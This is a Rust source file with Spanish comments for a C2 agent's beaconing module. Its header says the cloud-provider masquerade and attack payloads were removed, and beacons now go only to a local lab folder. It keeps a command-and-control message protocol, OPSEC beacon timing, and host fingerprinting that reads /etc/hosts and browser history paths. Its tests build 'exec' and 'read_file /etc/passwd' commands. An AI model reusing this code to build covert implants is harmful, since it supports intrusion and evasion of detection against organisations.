// Smoke Signals — transporte de beaconing de la colonia (ronda 11: sin
// camuflaje contra terceros).
//
// Historia: este módulo enviaba beacons POST a proveedores cloud REALES
// (Windows Update, Office 365, Google Drive, Apple Push…) con User-Agents
// suplantados y payloads disfrazados — masquerade de C2 de la era ofensiva,
// con tráfico de basura a servicios de terceros y sin llegar jamás al C2 del
// operador. La ronda 6 eliminó los payloads de ataque; la ronda 11 elimina
// el transporte encubierto restante bajo el mismo mandato ("real o
// eliminar").
//
// Lo que queda, honesto y lab-scoped:
// - `SmokeChannel::send_beacon` SOLO captura beacons a fichero local
//   (`/tmp/smoke_beacons/`, sink de inspección) cuando `HIVE_LAB_MODE` está
//   activo — el sink que usan los tests de failover. Fuera de lab mode
//   devuelve error: no hay envío a terceros.
// - La entrega REAL al C2 va directa por HTTP a `HIVE_C2_URL` (ver
//   `comms::send_c2_beacon`), con User-Agent propio y sin disfraz.
// - `C2Message`/`extract_c2_response` (protocolo) y `learn_org_profile`
//   (calibración de timing del host LOCAL para el jitter OPSEC) se conservan.
use chrono::Timelike;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::atomic::AtomicUsize;
use tracing::info;
use uuid::Uuid;

/// Service templates for traffic emulation (ronda 11: solo etiquetas de
/// canal para el sink de lab — sin hosts/rutas/UAs de terceros).
#[derive(Debug, Clone, PartialEq)]
pub enum SmokeChannel {
    WindowsUpdate,
    Office365,
    AzureServiceBus,
    GoogleDrive,
    GitHubActions,
    ApplePush,
    CloudFrontCDN,
}

impl SmokeChannel {
    /// Etiqueta legible del canal (logs/inspección del sink de lab).
    pub fn label(&self) -> &'static str {
        match self {
            SmokeChannel::WindowsUpdate => "windows_update",
            SmokeChannel::Office365 => "office365",
            SmokeChannel::AzureServiceBus => "azure_servicebus",
            SmokeChannel::GoogleDrive => "google_drive",
            SmokeChannel::GitHubActions => "github_actions",
            SmokeChannel::ApplePush => "apple_push",
            SmokeChannel::CloudFrontCDN => "cloudfront_cdn",
        }
    }

    /// Random channel selection for traffic diversity.
    pub fn random() -> Self {
        use rand::Rng;
        match rand::thread_rng().gen_range(0..7) {
            0 => SmokeChannel::WindowsUpdate,
            1 => SmokeChannel::Office365,
            2 => SmokeChannel::AzureServiceBus,
            3 => SmokeChannel::GoogleDrive,
            4 => SmokeChannel::GitHubActions,
            5 => SmokeChannel::ApplePush,
            _ => SmokeChannel::CloudFrontCDN,
        }
    }

    /// Send a beacon payload to the lab sink.
    ///
    /// Ronda 11: ÚNICO comportamiento restante. En lab mode
    /// (`HIVE_LAB_MODE` activo) escribe el beacon a `/tmp/smoke_beacons/`
    /// para inspección offline — es el sink que ejercitan los tests de
    /// failover. Fuera de lab mode devuelve error SIEMPRE: el envío
    /// camuflado a proveedores cloud reales (con User-Agents suplantados)
    /// fue eliminado — la entrega al C2 es directa vía `HIVE_C2_URL`
    /// (`comms::send_c2_beacon`), jamás a través de canales de terceros.
    pub async fn send_beacon(&self, agent_data: &[u8]) -> Result<Vec<u8>, String> {
        if cfg!(test) || std::env::var("HIVE_LAB_MODE").is_ok() {
            let dir = "/tmp/smoke_beacons";
            std::fs::create_dir_all(dir)
                .map_err(|e| format!("Failed to create beacon dir '{}': {}", dir, e))?;
            let filename = format!(
                "{}/beacon_{}.bin",
                dir,
                chrono::Local::now().format("%Y%m%d_%H%M%S_%3f")
            );
            std::fs::write(&filename, agent_data)
                .map_err(|e| format!("Failed to write beacon to '{}': {}", filename, e))?;
            info!("SMOKE: beacon captured to lab sink {}", filename);
            return Ok(Vec::new());
        }

        Err(
            "cloud-masquerade transport removed (ronda 11): beacon delivery is direct via HIVE_C2_URL; set HIVE_LAB_MODE=1 to use the local lab sink"
                .to_string(),
        )
    }
}

fn base64_encode(data: &[u8]) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut s = String::new();
    for chunk in data.chunks(3) {
        let b0 = chunk.first().copied().unwrap_or(0) as u32;
        let b1 = chunk.get(1).copied().unwrap_or(0) as u32;
        let b2 = chunk.get(2).copied().unwrap_or(0) as u32;
        let t = (b0 << 16) | (b1 << 8) | b2;
        s.push(CHARS[((t >> 18) & 0x3F) as usize] as char);
        s.push(CHARS[((t >> 12) & 0x3F) as usize] as char);
        s.push(if chunk.len() > 1 {
            CHARS[((t >> 6) & 0x3F) as usize] as char
        } else {
            '='
        });
        s.push(if chunk.len() > 2 {
            CHARS[(t & 0x3F) as usize] as char
        } else {
            '='
        });
    }
    s
}

fn base64_decode(data: &[u8]) -> Result<Vec<u8>, String> {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    // Build reverse lookup table
    let mut rev = [255u8; 256];
    for (i, &c) in CHARS.iter().enumerate() {
        rev[c as usize] = i as u8;
    }

    let data_str =
        std::str::from_utf8(data).map_err(|_| "Invalid base64: not valid UTF-8".to_string())?;
    // Strip padding characters
    let data_str = data_str.trim_end_matches('=');

    let mut result = Vec::new();
    let mut buf: u32 = 0;
    let mut bits = 0;

    for &c in data_str.as_bytes() {
        let val = rev[c as usize];
        if val == 255 {
            return Err(format!("Invalid base64 character: '{}'", c as char));
        }
        buf = (buf << 6) | val as u32;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            result.push((buf >> bits) as u8);
            buf &= (1 << bits) - 1;
        }
    }

    Ok(result)
}

/// Manages multiple `SmokeChannel` instances, dispatching beacon traffic
/// across one or more channels with round-robin support.
pub struct SmokeDirector {
    channels: Vec<SmokeChannel>,
    round_robin_counter: AtomicUsize,
}

impl Default for SmokeDirector {
    fn default() -> Self {
        Self {
            channels: Vec::new(),
            round_robin_counter: AtomicUsize::new(0),
        }
    }
}

impl SmokeDirector {
    /// Create a new empty director.
    pub fn new() -> Self {
        Self::default()
    }

    /// Add a channel. Duplicate channels are silently ignored.
    pub fn add_channel(&mut self, channel: SmokeChannel) {
        if !self.channels.contains(&channel) {
            self.channels.push(channel);
        }
    }

    /// Remove a channel. No-op if the channel is not present.
    pub fn remove_channel(&mut self, channel: SmokeChannel) {
        self.channels.retain(|c| c != &channel);
    }

    /// Send beacon payload to all configured channels.
    ///
    /// Returns a vector of results in the same order as the channels.
    pub async fn beacon_all(&self, agent_data: &[u8]) -> Vec<Result<Vec<u8>, String>> {
        let mut results = Vec::with_capacity(self.channels.len());
        for channel in &self.channels {
            results.push(channel.send_beacon(agent_data).await);
        }
        results
    }

    /// Send beacon payload to one channel using round-robin selection.
    ///
    /// Returns an error if no channels are configured.
    pub async fn beacon_round_robin(&self, agent_data: &[u8]) -> Result<Vec<u8>, String> {
        if self.channels.is_empty() {
            return Err("No channels configured in SmokeDirector".to_string());
        }
        let idx = self
            .round_robin_counter
            .fetch_add(1, std::sync::atomic::Ordering::SeqCst)
            % self.channels.len();
        self.channels[idx].send_beacon(agent_data).await
    }

    /// Number of configured channels.
    pub fn channel_count(&self) -> usize {
        self.channels.len()
    }
}

/// A command-and-control message exchanged via smoke channels.
///
/// Encoded as base64(JSON) for beacon payloads and decoded on the receiving end.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct C2Message {
    pub msg_id: Uuid,
    pub command: String,
    pub args: HashMap<String, String>,
    pub timestamp: u64,
}

impl C2Message {
    /// Create a new `C2Message` with an auto-generated UUID and current timestamp.
    pub fn new(command: String, args: HashMap<String, String>) -> Self {
        Self {
            msg_id: Uuid::new_v4(),
            command,
            args,
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs(),
        }
    }

    /// Serialize to JSON and base64-encode into a beacon payload.
    pub fn to_beacon_payload(&self) -> Vec<u8> {
        let json = serde_json::to_string(self).unwrap_or_else(|_| "{}".to_string());
        base64_encode(json.as_bytes()).into_bytes()
    }

    /// Decode a base64 beacon payload and deserialize.
    pub fn from_beacon_payload(data: &[u8]) -> Result<Self, String> {
        let decoded = base64_decode(data)?;
        let json_str =
            String::from_utf8(decoded).map_err(|e| format!("Invalid UTF-8 in payload: {}", e))?;
        serde_json::from_str(&json_str)
            .map_err(|e| format!("Failed to deserialize C2Message: {}", e))
    }
}

/// Extract a `C2Message` from beacon response bytes.
///
/// Looks for a JSON payload containing a `"command"` field and attempts
/// to deserialize it into a `C2Message`.
pub fn extract_c2_response(response: &[u8]) -> Option<C2Message> {
    let s = std::str::from_utf8(response).ok()?;

    // Quick pre-check: the JSON must contain "command" as a key
    if !s.contains("\"command\"") {
        return None;
    }

    serde_json::from_str(s).ok()
}

// ── Organizational Camouflage: Learn & Mimic ──────────────────────────

/// Discovered cloud service fingerprint of the victim organization.
#[derive(Debug, Clone, Default)]
pub struct OrgCloudProfile {
    pub google_workspace: bool,      // Uses Google Workspace
    pub microsoft_365: bool,         // Uses Office 365 / Azure AD
    pub aws: bool,                   // Uses AWS services
    pub salesforce: bool,            // Uses Salesforce
    pub slack: bool,                 // Uses Slack
    pub zoom: bool,                  // Uses Zoom
    pub custom_domains: Vec<String>, // Custom SaaS domains observed
    pub peak_hours: Vec<u8>,         // 24 slots: 0-23, count of traffic spikes
    pub trusted_cdn: Vec<String>,    // CDNs in use (CloudFront, Fastly, etc.)
}

/// Analiza el perfil de servicios cloud del PROPIO host de laboratorio
/// (/etc/hosts, presencia de historiales, cachés) para calibrar el timing
/// del beaconing (ventanas horarias, jitter OPSEC).
///
/// Ronda 11: era "learn the victim's cloud profile" — reencuadrado a host
/// local de lab: solo lectura, y su único consumidor es la calibración
/// OPSEC del propio agente (jamás selecciona canales de envío: el
/// masquerade se eliminó).
pub fn learn_org_profile() -> OrgCloudProfile {
    let mut profile = OrgCloudProfile::default();

    // Check DNS cache for cloud service lookups
    if let Ok(entries) = std::fs::read_dir("/var/cache/bind") {
        // Simplified — real impl parses DNS cache files
        let _ = entries.count();
    }

    // Check /etc/hosts for custom entries
    if let Ok(hosts) = std::fs::read_to_string("/etc/hosts") {
        for line in hosts.lines() {
            let lower = line.to_lowercase();
            if lower.contains("googleapis") || lower.contains("google.com") {
                profile.google_workspace = true;
            }
            if lower.contains("office365") || lower.contains("outlook") || lower.contains("azure") {
                profile.microsoft_365 = true;
            }
            if lower.contains("aws") || lower.contains("amazonaws") {
                profile.aws = true;
            }
            if lower.contains("salesforce") {
                profile.salesforce = true;
            }
            if lower.contains("slack") {
                profile.slack = true;
            }
            if lower.contains("zoom") {
                profile.zoom = true;
            }
        }
    }

    // Check browser history for cloud URLs (Firefox/Chrome)
    let history_paths = [
        format!(
            "{}/.mozilla/firefox",
            std::env::var("HOME").unwrap_or_default()
        ),
        format!(
            "{}/.config/google-chrome",
            std::env::var("HOME").unwrap_or_default()
        ),
    ];
    for hp in &history_paths {
        if std::path::Path::new(hp).exists() {
            // In production: parse SQLite history DB
            // Simplified: flag true if profile dir exists
            profile.microsoft_365 = profile.microsoft_365
                || std::path::Path::new(&format!("{}/Default/History", hp)).exists();
        }
    }

    // Detect CDNs by checking common cache headers in /tmp
    let cdn_domains = [
        "cloudfront.net",
        "fastly.net",
        "azureedge.net",
        "cdn.jsdelivr.net",
    ];
    for cdn in &cdn_domains {
        if std::path::Path::new(&format!("/var/cache/nginx/{}", cdn)).exists() || {
            let cache_path = format!("/tmp/.{}_cache", (*cdn).replace('.', "_"));
            std::path::Path::new(&cache_path).exists()
        } {
            profile.trusted_cdn.push(cdn.to_string());
        }
    }

    // Estimate peak traffic hours (simplified: just mark business hours)
    for h in 8..=18 {
        profile.peak_hours.push(h);
    }

    info!(
        "SMOKE: learned org profile: Google={} M365={} AWS={} CDNs={:?}",
        profile.google_workspace, profile.microsoft_365, profile.aws, profile.trusted_cdn
    );

    profile
}

/// Adapt C2 beacon timing to the local host's active hours (ronda 11:
/// calibración de timing, sin selección de canales).
pub fn should_beacon_now(profile: &OrgCloudProfile) -> bool {
    let now = chrono::Local::now().hour() as u8;
    if profile.peak_hours.is_empty() {
        return true; // No data, always beacon
    }
    profile.peak_hours.contains(&now)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_profile_learns() {
        let profile = learn_org_profile();
        // At minimum should have peak hours
        assert!(!profile.peak_hours.is_empty());
    }

    #[test]
    fn test_beacon_timing() {
        let profile = OrgCloudProfile {
            peak_hours: vec![8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18],
            ..Default::default()
        };
        let now = chrono::Local::now().hour() as u8;
        let should = should_beacon_now(&profile);
        info!("Beacon now (hour {}): {}", now, should);
    }

    // ── SmokeDirector tests ─────────────────────────────────────

    #[tokio::test]
    async fn test_smoke_director_add_remove_channels() {
        let mut director = SmokeDirector::new();
        assert_eq!(director.channel_count(), 0);

        director.add_channel(SmokeChannel::WindowsUpdate);
        director.add_channel(SmokeChannel::Office365);
        director.add_channel(SmokeChannel::AzureServiceBus);
        assert_eq!(director.channel_count(), 3);

        // Duplicate adds should be ignored
        director.add_channel(SmokeChannel::WindowsUpdate);
        assert_eq!(director.channel_count(), 3);

        director.remove_channel(SmokeChannel::Office365);
        assert_eq!(director.channel_count(), 2);

        // Removing non-existent channel should not panic
        director.remove_channel(SmokeChannel::GoogleDrive);
        assert_eq!(director.channel_count(), 2);
    }

    #[tokio::test]
    async fn test_smoke_director_beacon_all() {
        // Clean up any leftover beacon files from previous runs
        let _ = std::fs::remove_dir_all("/tmp/smoke_beacons");

        let mut director = SmokeDirector::new();
        director.add_channel(SmokeChannel::WindowsUpdate);
        director.add_channel(SmokeChannel::Office365);

        let agent_data = b"test_agent_data_for_beacon_all";
        let results = director.beacon_all(agent_data).await;

        assert_eq!(results.len(), 2);
        for result in &results {
            assert!(result.is_ok(), "beacon_all result should be Ok in lab mode");
        }

        // Verify lab mode wrote beacon files
        let beacon_dir = std::path::Path::new("/tmp/smoke_beacons");
        assert!(
            beacon_dir.exists(),
            "beacon directory should exist after beacon_all"
        );

        // Verify at least one file was written (there could be more from parallel runs)
        let entries: Vec<_> = std::fs::read_dir(beacon_dir)
            .expect("beacon_dir should be readable")
            .collect::<Result<Vec<_>, _>>()
            .expect("entries should be readable");
        assert!(!entries.is_empty(), "at least one beacon file should exist");

        // Clean up
        let _ = std::fs::remove_dir_all("/tmp/smoke_beacons");
    }

    // ── C2Message tests ──────────────────────────────────────────

    #[test]
    fn test_c2_message_roundtrip() {
        let mut args = HashMap::new();
        args.insert("hostname".to_string(), "workstation-42".to_string());
        args.insert("os".to_string(), "Windows 11".to_string());

        let original = C2Message {
            msg_id: Uuid::new_v4(),
            command: "exec".to_string(),
            args: args.clone(),
            timestamp: 1712345678,
        };

        let payload = original.to_beacon_payload();
        let decoded = C2Message::from_beacon_payload(&payload)
            .expect("Should decode and deserialize successfully");

        assert_eq!(decoded.command, original.command);
        assert_eq!(decoded.args, original.args);
        assert_eq!(decoded.timestamp, original.timestamp);
        assert_eq!(decoded.msg_id, original.msg_id);
    }

    #[test]
    fn test_extract_c2_response_found() {
        let mut args = HashMap::new();
        args.insert("target".to_string(), "/etc/passwd".to_string());

        let msg = C2Message {
            msg_id: Uuid::new_v4(),
            command: "read_file".to_string(),
            args,
            timestamp: 1712345678,
        };

        let json_bytes = serde_json::to_vec(&msg).unwrap();
        let extracted = extract_c2_response(&json_bytes);

        assert!(extracted.is_some(), "Should extract a C2Message");
        let extracted = extracted.unwrap();
        assert_eq!(extracted.command, "read_file");
        assert_eq!(
            extracted.args.get("target").map(|s| s.as_str()),
            Some("/etc/passwd")
        );
    }

    #[test]
    fn test_extract_c2_response_not_found() {
        // Random bytes with no JSON structure
        let data = b"this is not a valid c2 response at all";
        assert!(extract_c2_response(data).is_none());

        // Valid JSON but no "command" field
        let data = br#"{"status": "ok", "message": "hello"}"#;
        assert!(extract_c2_response(data).is_none());

        // Empty data
        let data = b"";
        assert!(extract_c2_response(data).is_none());
    }
}
